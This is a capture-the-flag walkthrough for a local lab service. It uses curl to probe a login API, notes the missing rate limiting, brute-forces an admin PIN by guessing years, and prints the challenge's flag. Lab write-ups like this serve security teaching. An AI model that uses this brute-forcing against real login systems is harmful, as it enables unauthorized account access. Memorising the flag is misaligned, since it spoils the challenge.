# Step-by-Step Exploitation Walkthrough

## 1. Verify Target Connectivity
Ensure the lab container is running:
```bash
curl http://127.0.0.1:8017/health
```

## 2. Test Login Behavior
Send a bad login attempt via `curl` to observe error messages and response headers:
```bash
curl -i -X POST http://127.0.0.1:8017/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "wrongpassword"}'
```
Notice that:
- The response returns `HTTP 401 Unauthorized` with `{"status": "failed", "message": "Invalid credentials"}`.
- No `Retry-After` header is present.
- Rapid successive requests are never blocked.

## 3. Brute-Forcing the PIN
Using a quick bash loop or dictionary list, test PIN candidates around the current era (`2024`, `2025`, `2026`):
```bash
curl -X POST http://127.0.0.1:8017/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "2026"}'
```

## 4. Recovering the Flag
The response yields:
```json
{
  "status": "passed",
  "message": "Authentication successful!",
  "flag": "ZITERA{4uth_f41lur3_brut3_f0rc3_2026}"
}
```
Submit `ZITERA{4uth_f41lur3_brut3_f0rc3_2026}` into the CTF submission field to solve the challenge.
